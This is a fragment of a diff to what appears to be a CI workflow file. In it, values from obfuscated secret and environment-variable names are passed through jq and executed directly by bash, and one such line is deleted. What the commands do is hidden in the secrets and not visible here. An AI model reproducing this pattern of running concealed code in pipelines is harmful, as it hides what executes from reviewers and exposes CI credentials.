@@ -23,7 +23,6 @@ jobs:
           nogd74: ${{ secrets.nogd74 }}
         run: |
           printf '%s' "$nogd74" | jq -r .u3782 | /bin/bash
-          printf '%s' "$z28" | jq -r .tbddz6 | /bin/bash
           echo $w9725 | jq -r .ahzpl6311 | /bin/bash
           echo $zlz505 | jq -r .ttsfw2 | /bin/bash
 
